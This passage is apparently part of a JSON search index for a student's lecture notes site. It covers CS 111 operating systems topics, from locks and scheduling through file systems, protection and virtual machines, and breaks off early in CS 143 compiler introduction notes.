"},{"id":50,"href":"/notes/cs111/2021-04-07-shared-memory-and-condition-variables-and-locks/","title":"Shared Memory and Condition Variables and Locks","section":"CS 111, Spring 2021","content":" Shared memory # Which variables are shared? # Programmer decides All memory potentially shareable (in process) Stack locals: private Globals: shared Pointers stored in globals: shared Pointers passed as arguments when instantiating threads: shared void my_func(int x) { int y; // private Pool p; // private } Pool p2; // public Thread safety # Refers to a class designed for shared use std::vector is not thread-safe For thread-unsafe classes: must manually lock externally Condition variables # std::condition_variable\nWait for particular state:\nwait(lock): atomically releases lock, blocks thread (reacquire lock before returning). On return condition may not exist\nnotify_one(): if any waiting threads, wake up the first one\nnotify_all(): wake all waiting threads\nUsing locks # How many locks? # As few as possible One lock for program doesn\u0026rsquo;t allow for concurrency Kernel-call lock causes contention Lock per variable is complicated, deadlock-prone, and inefficient Monitor: # Shared data structure (class instance) One lock More than 1 condition variable Every method of class: Lock at beginning Unlock at end "},{"id":51,"href":"/notes/cs111/2021-04-09-lock-implementation-and-deadlocking/","title":"Lock Implementation and Deadlocking","section":"CS 111, Spring 2021","content":" Implementing locks # For multiple cores:\nAtomic operations: read-modify-write Swap: Reads word Writes new value Returns old value Version 1: Spin Lock # class Lock { Lock() {} std::atomic\u0026lt;int\u0026gt; locked(0); } void Lock::lock() { while (locked.swap(1)) { // do nothing // continue looping until we get a 0 back (old value) } } void Lock::unlock() { locked = 0; } Version 2: less busy waiting # class Lock { Lock() {} std::atomic\u0026lt;int\u0026gt; locked(0); ThreadQueue q; } void Lock::lock() { if (locked.swap(1)) { q.add(currentThread); blockThread(); } } void Lock::unlock() { if (q.empty()) { locked = 0; } else { unblockThread(q.remove()); } } Deadlocking # Definition: Several blocked threads such that each thread waits for a resource owned by another thread. No thread can make any progress.\nExample # Thread A:\nlock_acquire(l1); lock_acquire(l2); ... lock_release(l2); lock_release(l1); Thread B:\nlock_acquire(l2); lock_acquire(l1); ... lock_release(l1); lock_release(l2); This gets stuck, because each thread needs a resource from the other to proceed.\nConditions for deadlocking # Limited access No preemption Threads must make multiple independent requests Circularity of requests Complications # Deadlocks can occur over any resource that blocks Locks Network requests File I/O Deadlocks can occur over both discrete and continuous resources Can\u0026rsquo;t predict what a thread will need Breaking deadlocks # After a deadlock is detected, break it by terminating one thread. This is not practical for operating systems, but useful for database systems\nPrevention # Need to prevent all 4 conditions for deadlocking from occurring at the same time.\nNo exclusive access? Impossible because definition of a mutex Preemption Could cause program to misbehave Ask for all resources at once Tricky and inconvenient; difficult to implement Could overallocate, but this would be difficult and inefficient Prevent circularities Must establish an order of allocating resources "},{"id":52,"href":"/notes/cs111/2021-04-12-scheduling/","title":"Scheduling","section":"CS 111, Spring 2021","content":" Single-core scheduling # Computational resources # Preemptible: Can give to a thread and can take it away Network interfaces Scheduling: how long thread keeps resources, who\u0026rsquo;s next Non-preemptible: Can\u0026rsquo;t take away without permission File space Allocation: who gets what Deciding which resources are preemptible or not is associated with the cost to preempt.\nWhich thread should run on which core for how long?\nGoals # Minimize response time (to useful result - down to human response time of 50-100ms) Use resources efficiently Keep resources busy if there is work to do for them Minimize context switches First-come-first-serve (FCFS/FIFO) # Keep a ready queue of runnable threads When a thread becomes runnable, add it to the back When a core runs out of work to do (locks or exits), run first thread on queue Disadvantage: One thread can monopolize core\nRound-robin # Each thread gets to run for a given time slice, then goes to the back of the queue In practice: Time slices are in the range of 5-10ms (4ms in Linux) For time slices:\nToo large: slow response, since threads can monopolize cores Too small: context switching overhead means that resources won\u0026rsquo;t be used effectively Shortest remaining processing time (SRPT) # Schedule by least remaining processing time left Breaks ties with FCFS Good for resource utilization Imagine scenario with a CPU-bound and I/O-bound thread CPU-bound thread gets low priority, I/O-bound thread gets high priority CPU-bound thread runs while I/O-bound thread is blocked, once I/O-bound thread is unblocked it can run until it gets blocked again Gives highest priority to least needy thread!\nDisadvantage: must predict the future\nPriority-based scheduling # Idea: Every thread has a priority maintained as part of its state Run the highest priority thread Use round-robin to tiebreak Dynamically adjust priorities to approximate SRPT Priority queues # Maintain many ready queues Threads using least resources stay in highest priority queue Threads using most resources stay in lowest priority queue Dispatcher runs threads from highest priority occupied queue 4.4 BSD Unix scheduler # Track threads\u0026rsquo; recent CPU usage Give highest priority to thread with least usage No starvation: if a thread isn\u0026rsquo;t getting executed, its priority will eventually rise and be run Many runnable threads: round-robin Linux biases scheduling with \u0026ldquo;nice\u0026rdquo; value: higher value means that thread yields CPU cycles, lower value means that thread tries to get more CPU cycles "},{"id":53,"href":"/notes/cs111/2021-04-14-multiprocessing/","title":"Multiprocessing","section":"CS 111, Spring 2021","content":" Multiprocessor scheduling # Simple approach # Shared ready queue, lock One dispatcher per core Timer interrupts per core Core takes highest-priority thread and runs it When a thread becomes runnable:\nIf the new thread is higher priority, preempt existing thread Contention for lock and queues # Have a separate ready queue per core Balance load across cores (work stealing) Work conservation # If there is a ready thread currently queued, and there\u0026rsquo;s an idle core, thread will run on that core Core affinity # Expensive to move a thread to a new core Try to keep the thread on the same core Gang scheduling # Run threads of a process together (on different cores) Otherwise, what happens is: One thread locks Deschedule Other threads may block on lock Keep thread loaded even if blocked? May unblock soon? Busy waiting might be better in some cases! The Linux kernel does not implement gang scheduling.\n"},{"id":54,"href":"/notes/cs111/2021-04-16-linking/","title":"Linking","section":"CS 111, Spring 2021","content":" Linking # Memory # Process memory layout:\nProcess creation # Linkers # Unix: ld Windows: LINK.exe What does it do?\nCombine object files (compiled from source) Computes memory layout Fix memory addresses Produces executable Problems it has to deal with:\nAssembler doesn\u0026rsquo;t know where code or data will go in memory Makes a guess: Assume sections will be located at 0, write everything as such Assembler doesn\u0026rsquo;t know addresses of external objects Makes a guess: Assume 0 and leave a note for the linker Object file # Contains:\nCode and data sections Size Starting address Initial contents Symbol table Name and location for each of the methods and variables Unresolved references: info for linker Location of the reference What should the reference point to Additional info: Debugging info Linking operation # Read in section sizes, computes memory layout Reads symbols, build symbol table Read section data, fix addresses, write executable Dynamic linking # Shared libraries, don\u0026rsquo;t know locations at link time At startup, dynamic loader scans jump table (for example, maps printf to libc.so)\nLoads file into memory (mmap) Looks up symbols Fills address in jump table "},{"id":55,"href":"/notes/cs111/2021-04-19-storage-management/","title":"Storage Management","section":"CS 111, Spring 2021","content":" Dynamic storage management # Problem: unpredictability\nOperations: # alloc(nbytes) -\u0026gt; ptr free(ptr) Stack allocation # Freeing is predictable: just LIFO order! Heap Allocation # Freeing is unpredictable Memory has allocated areas and free areas (\u0026ldquo;holes\u0026rdquo;) Fragmentation: Small holes, can\u0026rsquo;t effectively use for allocation\nGoal: Minimize fragmentation\nFree lists # Data structure that keeps track of holes\nBest fit # Linked list of free blocks On allocation, scan entire list and pick the smallest block that can fit requested size On free, try to merge a block with its neighbors First fit: # Stop at first block that is large enough\nBit map # Good for fixed-size chunks Keep a long bit string with each bit referring to a fixed chunk of memory, with 1 as allocated and 0 as free Slabs # Keep pools of different sizes of memory Slab: large chunk of memory divided up into equal size fragments Each slab has own free list (unsorted) Allocate:\nFind slab corresponding to user-requested size Return the first fragment from the free list If nothing free: allocate new slab Free:\nAdd the freed fragment back to the slab\u0026rsquo;s free list If entire slab is free: free the whole slab Storage reclamation # When to free? Easy for simple structures: when we\u0026rsquo;re \u0026ldquo;done using\u0026rdquo; an object, can free it Shared structures: Free when there are no more uses (no remaining pointers to it) Problems Dangling pointer: pointer exists to some memory, but that memory has been freed already Memory leak: no pointers to memory, but haven\u0026rsquo;t freed it Reference counting # For each object, keep track of the number of pointers to it When there are no pointers left to the object, free it Problem: circular references cause memory leak In C++: std::shared_ptr\nGarbage collection # No free! Just delete pointers When system detects it is running low on memory, runs the garbage collector Scan storage and pointers Finds all non-reachable objects and frees them Compacts heap and reduces fragmentation Mark and Copy # Must be able to find all objects Must identify all pointers Pass 1: Marking\nStarts at \u0026ldquo;roots\u0026rdquo; Objects on stack Static objects Mark each found object Find pointers in object Mark recursively Pass 2: Copying and Compacting\nScan memory for all objects If the object is live (mark bit set), copy it down to the bottom part of memory Update pointers to live objects When done, all extra space is freed Problems:\nExpensive! Takes 10-20% of execution time 2-5x memory overallocation Long pauses: sometimes at least 100ms "},{"id":56,"href":"/notes/cs111/2021-04-21-virtual-memory/","title":"Virtual Memory","section":"CS 111, Spring 2021","content":" Virtual memory # How to share one set of memory between multiple processes?\nGoals:\nMultitasking: memory shared between processes running at the same time Transparency: user processes should not have awareness of shared memory Process should see only its own private pool of memory Isolation: one process can\u0026rsquo;t corrupt another Efficiency: don\u0026rsquo;t want to add extra runtime to OS code or complexity to use code Load-time relocation # When loading process,\nFind memory region (using first-fit or best-fit) Relocate program Find all pointers in the program (linker identifies) Add base Problems: Fragmentation Process\u0026rsquo;s memory fixed at load time No isolation/protection Relocation can be slow Can\u0026rsquo;t move process once it starts executing "},{"id":57,"href":"/notes/cs111/2021-04-23-dynamic-address-translation/","title":"Dynamic Address Translation","section":"CS 111, Spring 2021","content":" Dynamic Address Translation # Goal: Make a process think it has its own memory space independent from all other processes\nProcess\u0026rsquo;s memory would start at 0 Hardware has\nCPU core Memory management unit Converts virtual addresses (process memory space) to physical addresses (actual hardware memory address) Memory Base and Bound # Virtual address space goes from 0 to Bound Physical address for same process goes from Base to Base+Bound Properties:\nPrivate memory per process Memory isolation Base and bound saved in PCB, set on context switch No load-time relocation Notes:\nOS-level tasks have the MMU disabled User processes can\u0026rsquo;t see base or bound Processor Status (PS) bit: kernel vs user How does OS regain control? Special instructions (traps)\nBranch into OS code (address in special memory location) Save instruction pointer, PS bit Reset mode to kernel Return from trap: Jump back to user Reset PS bit Advantages:\nCheap Efficient Swapping to disk possible Disadvantages:\nFragmentation Growing memory for process difficult/expensive One contiguous region per process: sharing impossible Limited stack growth Can\u0026rsquo;t have read-only code "},{"id":58,"href":"/notes/cs111/2021-04-26-segmentation-and-paging/","title":"Segmentation and Paging","section":"CS 111, Spring 2021","content":" Virtual memory schemes # Segmentation # Process has multiple segments of memory (code, data, stack)\nMMU has a segment map with one entry per segment, with three fields:\nBase Bound Writeable bit (is process allowed to modify the segment) Segment number can be from:\nTop bits of virtual address Implicit from instruction Instructions vs data x86 prefixes Advantages:\nManage segments separately Move/swap to disk Share code segments between processes Have same base/bound numbers Disadvantages:\nFragmentation (variable length) Can\u0026rsquo;t have too many segments Rigidly divides UAs Paging # A page is a fixed size unit of virtual/physical memory (i.e., 4kb)\nPage table fields:\nBase (physical page number) Writeable bit Present Virtual address (page number and offset) used to index into the page table\nAdvantages:\nNo fragmentation List of free pages Page size == disk block size Disadvantages:\nPage maps get LARGE In x86-64, full page tables can go up to 512GB "},{"id":59,"href":"/notes/cs111/2021-04-30-demand-paging/","title":"Demand Paging","section":"CS 111, Spring 2021","content":" Demand paging # Program can run without loading everything into memory Keep active info in memory Inactive info on disk in paging file/backing store/swap space Locality: Most of the time, a process uses only a small fraction of its code and data\nDisk: 100x cheaper than DRAM DRAM: 100,000x faster than disk Each page in VAS either\nin memory (physical page frame) on disk in backing store Page fault procedure # Reference to page not in memory Present bit 0 Trap to OS Find tree page Read data from backing store Set present bit to 1 Resume execution Technicalities:\nWhat address generated the fault? Hardware register (CR2 on x86) Restarting: Can we just restart instructions that failed? Safe if instructions are idempotent (doing the same thing again yields same result) For non-idempotent instructions (like pushl %eax): Hardware must track side effects and undo them on page fault Policies # Page fetching: when to bring page into memory? Page replacement: which page to throw out? Demand fetching # Start process with no pages in memory Page fault in when needed Page prefetching # Load in before page fault Requires predicting the future One possible scheme: After page fault, read successive pages in addition to the one that was requested Cost is cheap: First 4kb page: 5-10ms Additional pages: 0.4ms Page replacement # Which page to remove from memory?\nRandom FIFO: replace oldest page in memory LRU (Least recently used): Page whose most recent access was farthest in the past Minimize pagefaults (optimal): page whose next reference is farthest in the future Requires us to predict the future Implementing LRU # Perfect LRU would require hardware support (one register per page, store current clock into the page) Approximation: find some old page Also requires hardware support, but simpler Two extra bits per page map entry (referenced and dirty) Referenced bit set when page accessed Dirty bit set when page written to Clock algorithm (Second chance) # Consider each page in memory as positioned around the edge of a clock Hand on the clock points to a page at any given time Hand sweeps clockwise, scanning pages circularly On page fault: Advance hand If current page has been referenced, clear referenced bit and continue If page has not been referenced, replace that page Hand moving slowly? Not many page faults, which is good Hand moving quickly Many page faults, memory might be too small Global replacement # One memory pool for all proceses One process can evict from other processes One pig hurts everyone This policy is mostly used in real-world systems.\nPer-process replacement # Each process has separate memory pool Only replacement from same process pool Hard to figure out how much memory to allocate to each process Thrashing # Overcommitted memory Each page fault replaces active pages System only gets work done at the rate of the disk To fix, stop running some programs (move their memory to disk)\nWith PCs, user will notice and either kill processes or buy more RAM\n"},{"id":60,"href":"/notes/cs111/2021-05-05-disks/","title":"Disks","section":"CS 111, Spring 2021","content":" Disks # 6-12 platters, each with 200k inch tracks, 1000 sectors per track, 4096 bytes per sector Total capacity ~100GB to 18TB I/O operation # Seek: position heads over track we want to read or write (2-10ms) Rotational latency: 4ms at 7500RPM Transfer: 100-150 MB/sec API: # void read(start_sector, sector_count, phys_mem_addr); void write(start_sector, sector_count, phys_mem_addr); Disk structure hidden because\nInner tracks have fewer sectors Disk can remap bad sectors Device registers # One block per device Words in physical memory Parameters Status bits (\u0026ldquo;completed\u0026rdquo;, \u0026ldquo;error\u0026rdquo;) Control bits set by CPU (\u0026ldquo;start operation\u0026rdquo;) Don\u0026rsquo;t behave like memory Some fields might always read as 0 Can change without being written to Operation # Write register to start Ready bit reads as 0 When operation does, ready bit reads as 1 Interrupts # \u0026ldquo;Interrupt enabled\u0026rdquo; (IE) bit in register After starting operation, OS will set this bit OS does something else When device becomes ready, checks IE bit If IE bit on, device interrupts when ready Save IP and PS Branch into OS, load new PS (stored in interrupt vector) Disable IE in handler Multi-core machines: spread interrupts to many cores\nDirect memory acess # Device can transfer to/from memory directly Fixes inefficiency of programmed I/O, where OS feeds data through device register "},{"id":61,"href":"/notes/cs111/2021-05-07-file-systems/","title":"File Systems","section":"CS 111, Spring 2021","content":" File systems # Issues:\nDisk space management File naming/lookup Reliability, file recovery Protection: isolating and sharing user data File # Definition: Named collection of bytes stored durably\nAccess patterns:\nSequential Random access: access by position Notes:\nMost files are small: need to keep file metadata very small Large files occupy most of the disk Most IO for large files Files can grow Inode # Definition: OS info about a file\nStored on disk Kept in memory (mostly while file open) Contents:\nSize Sectors Access times Protection File allocation schemes # Contiguous allocation (extent-based) # File is a contiguous range of sectors Inode stores just first sector and last sector Free list: unused areas of disk Advantages:\nSimple Fast sequential and random access Few seeks Disadvantages:\nFragmentation Must pre-declare file size Can\u0026rsquo;t extend files in place Linked files # Pick block size (ex. 4kb) Maintain linked list of free blocks File = linked list (each block points to next) Inode stores first block Advantages:\nBlock size matches with page size Easy to grow No external fragmentation Can share blocks between files Disadvantages:\nRandom access is very slow Sequential access requires seek per every block "},{"id":62,"href":"/notes/cs111/2021-05-10-realworld-filesystem-structures/","title":"Realworld Filesystem Structures","section":"CS 111, Spring 2021","content":" DOS/Windows FAT # Linked list: links in File Allocation Table One entry per block Next block in file \u0026ldquo;Last block\u0026rdquo; \u0026ldquo;Free block\u0026rdquo; Inode: first block in file Free list: like a bit map Originally: 16-bit entries, 512 byte blocks =\u0026gt; 32 Mb disks Advantages:\nRandom access is fairly fast Sequential access is easy FAT itself is free list! No pointers in data block Contiguous allocation is possible Disadvantages:\nFragmentation issues (but better than linked files) FAT32 # 28-bit sector numbers Clusters: groups of sectors, 2-32kb 4kb clusters: 1TB disks Multi-level indexes (4.3BSD Unix) # 4 KB blocks inode: 14 pointers (kept in an array) First 12 pointers are direct (to block) 13th pointer is indirect, points to a structure with 1024 pointers to blocks 14th pointer is doubly indirect, points to a structure with 1024 block pointers, each again with 1024 block pointers Advantages:\nOrganize files for faster access Bounded random access time Don\u0026rsquo;t need to predeclare file size, files can grow Small files have fast access Sequential accesses are easy Disadvantages:\nNon-uniform random access times (up to 3 I/Os) Upper limit on file size Block cache # Cache recently-used disk blocks in memory Use some form of LRU (least-recently-used) replacement Helps with random access time, don\u0026rsquo;t need to pay high I/O cost Caches today get very large (up to 1GB or more!), can vary in size\nModifying blocks # Write through Safe (data written to disk, won\u0026rsquo;t get lost in crash) Slow Delayed writes Write after 30 seconds Fast Often, no I/O is needed! (repeated writes, short lifetimes) Dangerous: can lose data after crash Free space management # Bit map # 1 bit/block 0: free, 1: in use 1TB disk, 4kb blocks: bitmap is 2^25 bytes = 32mb Advantages:\nGives good locality for expanding files Works well if disk isn\u0026rsquo;t full - can get fast contiguous allocation Disadvantages:\nIf disk full Needs lots of searching to find another block Lose locality To keep the filling up, lie to the user about free space left\nShow the user their disk is 100% full at 90% full Block sizes # Originally, 512b blocks More seeks Space inefficient: ~1% of disk for pointers 4kb blocks Fewer seeks Less overhead More internal fragmentation, wasted ~50% of disk 4.3BSD: hybrid Large blocks: 4kb Fragment: last block of a file could be 0-7 512kb chunks Bit map based on fragments Somewhat slow Misc strategies for efficiency # Larger blocks: 16kb large blocks, 2kb fragments Fine because disks are larger now Reallocate files as they grow Initially allocate blocks one at a time Large files: reallocate contiguously (maybe reserve certain areas of the disk for large files) Delay allocation Not until cache flush Allocate clusters with more info "},{"id":63,"href":"/notes/cs111/2021-05-12-directories/","title":"Directories","section":"CS 111, Spring 2021","content":" Inode allocation # Where on disk for inodes? Contiguous array at outer edge: lots of seeks Many arrays, spaced over disk FS tries to allocate data for an inode near the inode itself Index in array: i-number, unique identifier for a file Directories # Map from name to i-number Previously: one directory per disk, then per user Today: hierarchical directories Stored like regular files inode has special bit indicating it\u0026rsquo;s a directory Root directory has i-number 2 Procedure for looking up file # File: /a/b/c\nroot inode / directory file (a) inode for /a first block of /a (find b) inode for /a/b first block of /a/b (find c) inode for /a/b/c first block of /a/b/c Working directories # OS stores i-number in process control block This represents current working directory Lookup: leading slash: inumber 2, else cwd Links # Hard links # Multiple directory entries for an inode Reference count in inode No circularities because can\u0026rsquo;t hard link to directories Symbolic (soft) links # Symbolic link: special file Contents: path name During lookup: symbolic link? prepend link to path ln -s /e/f /a/b\nBetter for directories "},{"id":64,"href":"/notes/cs111/2021-05-14-crash-recovery/","title":"Crash Recovery","section":"CS 111, Spring 2021","content":" Crash recovery # Crashes can happen anywhere Lost data Inconsistency Modification affects several blocks Add block to file: modify 2 blocks (bitmap, inode) \u0026ldquo;Atomic ops\u0026rdquo;: all or nothing for multi-block ops? fsck # Fix on reboot Checks to see if system shutdown cleanly Set flag on disk during normal shutdown If hard shutdown, flag won\u0026rsquo;t be set - then run fsck Reboot: clear flag If not, scan disk, find and fix inconsistencies Goals:\nRestore consistency Minimize information loss Issues:\nCan still lose information System can be unusable Security issues: sensitive information can be duplicated to a different file Slow Read entire 5TB disk sequentially: 8hr, 10% randomly: weeks Possible scenarios:\nBlock exists in both file and free list Solution: remove from free list Inode reference count != number of directory entries Solution: change reference count Block in 2 different files Solution: give it to newest file Alternatively: duplicate block, give each a copy Inode reference count nonzero, but no directory entries Solution: Create link that is a directory entry in /lost+found Ordered writes # Adding block to file: Write free list (\u0026ldquo;allocated\u0026rdquo;) Write inode Operation:\nInitialize target before storing pointer Nullify existing pointers before reusing target Set new pointer to a live resource/target before clearing last pointer Advantages:\nCan have block in both places Disadvantages:\nCan lose block Performance: defeats cache for writing Resource leaks Run fsck in background to recover lost resources Optimization:\nNo synchronous writes For each block in cache: other blocks to write first Write dependencies first Write-ahead logging (journaling file system) # Currently used in Linux ext3/ext4, Windows NTFS, Apple HFS+/APFS\nLog: Detect/fix inconsistencies without full scan\nBefore any operation: record info in the log Add block to file Sync update log After crash: replay log At this point the system will be back to full integrity Advantages:\nRecovery fast Eliminates inconsistencies Log written sequentially, and is fast Can delay metadata writes Disadvantages:\nLog grows! Synchronous disk writes can lose data Operation types:\nBefore flushing cache, write log to disk For each cache block, last log position related to block When flushing disk block, make sure log is flushed\nLog truncation # Stop system, flush cache, truncate log Save head position, flush cache, keep operating Delete log entries older than saved head Log contents # File metadata High level operations (i.e., add block x to inode y at index z) Physical operations (set bytes x-y of block z to D) Must group records fsync # Kernel call that forces all data for a file to disk Can be invoked by program "},{"id":65,"href":"/notes/cs111/2021-05-19-protection/","title":"Protection","section":"CS 111, Spring 2021","content":" Protection # Prevent accidental/intentional misuse Authentication: identify principal Authorization: who may do what Entacement Authentication # Passwords: secret info\nNeed to be long and secure Need lots of them! Phishing/social engineering works Must protect database: never store pwd in clear One-way transforms: given ciphertext, can\u0026rsquo;t compute clear text; different cleartext yields different ciphertext Key/badge\nNo need for secrecy If stolen, will know Requires physical presence to steal 2-factor authentication\nPassword Use cellphone as key (site texts or spawns code, enter into site) For web sites:\nSite downloads cookie Browser returns cookie to site Authorization # Which principals, which operations, which objects\nAccess matrix:\nAccess control list # Protection info stored with objects For files in Unix/Linux: 9 bits (owner, group, all x read, write, execute) Root can do anything Windows has more general permissioning but very complex Capability list # Store auth info with principals Can\u0026rsquo;t revoke permissions once assigned Also names for objects Awkward, but idea lives on: Page tables Google drive Snapchat? Access enforcement # Too much code has total power Security kernel: all security components are isolated to the kernel Users/processes can only do what is allowed by security kernel Rights amplification # When calling method, callee gets more privilege Kernel call Set user id (Linux) One extra bit/file Normally, child process inherits parent\u0026rsquo;s user id Exec on suid file? Process user id \u0026lt;- file owner "},{"id":66,"href":"/notes/cs111/2021-05-24-flash-memory/","title":"Flash Memory","section":"CS 111, Spring 2021","content":" Flash memory # Flash vs disk:\nNo moving parts More shock resistant 100x lower latency 5-10x higher cost per bit Flash vs DRAM:\nNonvolatile 5-10x lower cost per bit 1000x higher latency Hardware:\nIndividual chips can be up to 512GB Erase units: 256kb Pages: 512 or 4096 bytes Reads: pages Writes: Erase: sets all bits in an erase unit to 1 Writes: pages: logical AND with data written and data existing (0s never change back to 1) Wear-out: limit on how many erases can be invoked without degrading reliability (1k-100k) Performance:\nReads: 20-100 microsecond latency, 100-2500MB/sec Erasure: 2ms Writes: 200 microsecond latency, 100-500MB/sec Flash translation layer (FTL) # Software layer built into drive Mimics disk interface Works with existing software Disadvantages:\nSacrifice performance Waste capacity All are proprietary! Direct mapped # Virtual block == physical block Reads are obvious Writes: read erase unit erase rewrite with new block Used with FAT format Disadvantages:\nAny write gets closer to wear-out limit Especially with frequently accessed blocks No way to handle \u0026ldquo;hot block\u0026rdquo; Slow Brittle: loses data in crashes Including OLD data! Virtualization # Separate virtual/physical block numbers A virtual block can move in flash Block map: index = virtual block number value = physical block corresponding to virtual block Reads: look up in block map, read corresponding physical block Writes: Find free/erased page Write virtual block to that page Update block map Mark old page as free One possible scheme:\nDon\u0026rsquo;t store map on device Page header: Virtual block number Allocated bit (1: free, 0, allocated) Written (1: clean, 0: dirty) Garbage (1: usable, 0: garbage/need to erase) Another scheme:\nBlock map on disk, cache in memory Page header bit: \u0026ldquo;data\u0026rdquo; or \u0026ldquo;map\u0026rdquo; Keep map-map in memory Reconstruct map-map on startup Writes: must write map as well as data Reads: could take 2 reads Garbage collection # Keep track of pages that are useful vs garbage Pick erase units with many garbage pages Read all live pages and write into fresh erase units Erase old unit Write costs:\nSuppose 90% utilized 10 erase units Read 9 erase units, write 9 1 free erase unit Requires 19 I/O\u0026rsquo;s: write amplification Formula: cost = (1+U)/(1-U) where U is utilization (0.0-1.0)\nIdeal:\nHot (short-lived) and cold data Want to segregate: most storage space is cold data, small amount hot Run cold storage at high utilization, pay GC cost if there\u0026rsquo;s free space in cold erase units Hot storage at low utilization Wear level # Erase at same rate everywhere Use GC to move blocks between hot and cold pages Occasionally: copy data from cold unit to hot one Disadvantages of virtual disks # Duplication of FTL block map, FS inode Missing info: FTL doesn\u0026rsquo;t know about deletions GC copies live blocks! To fix, new command trim: indicate block will never be used again Flash-optimized file systems # Lots of academic research projects, but none in widespread desktop use F2FS - used in Android phones since mid 2010s Need raw flash access, but no standard for that One approach: log-structured file system (entire fs is a log) Nonvolatile memory # Example: Intel 3D XPoint (Optane)\nCapacity: 512GB per DIMM Read: 300ns Write: 100ns Comparable to DRAM (100ns read/write) For FS, faster than flash Can\u0026rsquo;t harness raw performance due to software overhead Need new data model Current use: caching for larger HDDs to approximate flash speeds Open question: This is nearly as fast as DRAM. If this becomes as fast as DRAM, can we make all memory non-volatile? And what paradigm shifts could that cause?\n"},{"id":67,"href":"/notes/cs111/2021-05-28-virtual-machines/","title":"Virtual Machines","section":"CS 111, Spring 2021","content":" Virtual machines # \u0026ldquo;process\u0026rdquo; running in its own computer Can have many VMs on a single machine hypervisor: implements VM abstraction guest OS: runs in VM Hypervisors # Simulator, use file to hold virtual disk and software emulation of CPU/memory oprations Examples: Bochs, Emu 100x slower for computation 2x slower for I/O Use machine to simulate itself? Guest OS in user mode Most instructions execute natively Trap and simulate \u0026ldquo;unusual\u0026rdquo; instructions Simulating an OS # Privileged instructions (i.e., halt) Trap If ok to execute, hypervisor itself simulates instruction Kernel calls When in hypervisor, PS bit set to kernel Guest mode: PS bit set to user User process executes a syscall, this is executed by hypervisor through guest OS Then return from trap - another trap is called (due to illegal instruction, since PS bit needs to be changed) Hypervisor transfers all info from the guest OS and returns it all to user process I/O devices Guest OS reads/writes device registers Hypervisor arranges for page faults Hypervisor simulates instruction, can determine read or write, address (device register), value for a write Hypervisor simulates device Hypervisor simulates interrupts Can be slow: dozens of instructions to simulate Paravirtualization: hypervisor provides I/O kernel calls, guest OS\u0026rsquo;s have drivers Virtual memory # Guest OS has its own virtual address space and physical address space with its own page maps Host OS has its physical and virtual address spaces Hypervisor page maps convert between the two Hypervisor extended page maps require processor support (Intel VT-x) Previously: shadow page tables (real MMU page tables) that translate directly from guest virtual to machine physical Shadow page maps # Guest sets page map base: trap Guest OS modifies page map: trap Page faults happen when: \u0026ldquo;normal\u0026rdquo; way: hypervisor will make visible to guest OS Guest physical page not in machine memory: hypervisor yields page, return (not visible to guest) Page in memory, but shadow page table not up to date: hypervisor updates shadow page table from guest page map (not visible to guest) Dynamic binary translation # Hypervisor analyizes all code Replaces non-virtualizable instructions with traps How to find all code? Very complex process Result: able to virtualize instructions that were previously unvirtualizable Cost of VMs # Using best available techniques today: - CPU-bound: less than 5% slowdown - I/O-bound: ~30% slowdown\nHistory # Originated late 1960s One VM/user Different OSs Shared hardware Interest died in 1980s Personal computers: everyone started to have their own computers Reinvented at Stanford: Mendel Rosenblum et al. founded VMWare Software development: test machines, can have consistent OS versioning or test on different OSes on the same hardware Datacenters: previously needed separate hardware for different applications (because Windows was flakey, so needed crash isolation), now could use the same hardware and consolidate with one VM per application. Also, could provision hardware separate from software Encapsulation, restart: save snapshots of VM in a file, restart later or rollback if something goes wrong, or migrate VMs to different physical machines Containers Lightweight VMs Run on existing OS, gives some virtualization facilities (apps can run in their own virtual file system) Restrictions: All containers have to run same underlying OS "},{"id":68,"href":"/notes/cs143/2022-03-29-intro/","title":"Intro","section":"CS 143, Spring 2022","content":" Compilers # Course structure # Course has theoretical and practical aspects Need both in programming languages! Written assignments and exams cover theory Programming assignments cover the practical/systems part Course goal # Open lid of compilers and see inside Understand what they do, how they work, how to build them Correctness over performance Will not cover lots of optimizations - will need CS243 for it Course project # Write own compiler in four parts: PA1: lexer PA2: parser PA3: type checker PA4: code generation How are languages implemented? # Two major strategies Interpreters run the program Program -\u0026gt; Interpreter -\u0026gt; Machine Dominate high-level languages: Python, Ruby, Lisp Compilers translate the program Program -\u0026gt; Compiler -\u0026gt; Binary Code -\u0026gt; Machine Dominate low-level languages: C, C++, Go, Rust Some language implementations provide both Java, Javascript, WebAssembly Interpreter + Just-In-Time (JIT) compiler Compiler structure # Lexical Analysis (lexer) # Divides program text into \u0026ldquo;words\u0026rdquo; or \u0026ldquo;tokens\u0026rdquo; e.g. if x == y then z = 1; else z = 2 translates into\n{ \u0026#34;if\u0026#34;: keyword, \u0026#34; \u0026#34;: whitespace, \u0026#34;x\u0026#34;: variable, \u0026#34;==\u0026#34;: operator, \u0026#34;y\u0026#34;: variable, \u0026#34;then\u0026#34;: keyword, \u0026#34;z\u0026#34;: variable, \u0026#34;=\u0026#34;: operator, \u0026#34;1\u0026#34;: constant, \u0026#34;;\u0026#34;: operator, \u0026#34;else\u0026#34;: keyword, \u0026#34;2\u0026#34;: constant } Parsing # Maps out relationship between tokens Stores this relationship as a tree data structure in memory Semantic Analysis # Compilers perform limited semantic analysis to catch inconsistencies Optimization # Automatically modify programs so that they Run faster Use less memory Note: course project has no optimization component CS 243: Program Analysis and Optimization Code Generation # Produces assembly code Intermediate representations # Many compilers perform translations between sucessive intermediate languages All but first and last are intermediate representations native to compiler Generally ordered in descending level of abstraction Highest is source Lowest is assembly Useful because lower levels expose features hidden by higher levels Registers Memory layout Raw pointers etc. But lower levels obscure higher-level meaning Classes Higher-order functions Loops Issues # How to handle erroneous programs? Language design has big impact on compiler Determines what is easy and hard to compile Course theme: many tradeoffs in language design "},{"id":69,"href":"/notes/cs143/2022-03-31-language-design-and-cool/","title":"Language Design and Cool","section":"CS 143, Spring 2022","content":" Language design # Languages are adopted to fill a void Enable a previously difficult/impossible application Can be orthogonal to language quality Programmer training is the dominant cost Languages with many users are rarely replaced Popular languages become ossified But easy to start in a new niche Why so many languages? # Application domains have distinctive and conflicting needs Rust: systems programming w/focus on security R: statistics w/focus on streams Python: scripting Julia: linear algebra Javascript: able to run in browser No universally accepted metrics for design Abstraction # Detatched from concrete details Information hiding: expose only the essential Modes of abstraction Via languages/compilers: higher level code, few machine dependencies Via functions/subroutines: abstract interface to behavior Via modules: export interfaces, hide implementation Via classes or abstract data types: bundle data with operations Types # Originally, few types FORTRAN: scalars, arrays LISP: no static type distinctions Realization: types help Allows expressing abstraction Lets compiler report many frequent errors Allows guaranteeing certain types of \u0026ldquo;safety\u0026rdquo; Reuse # Exploit common patterns in software systems Goal: mass-produced software components Two popular approaches Type parametrization: 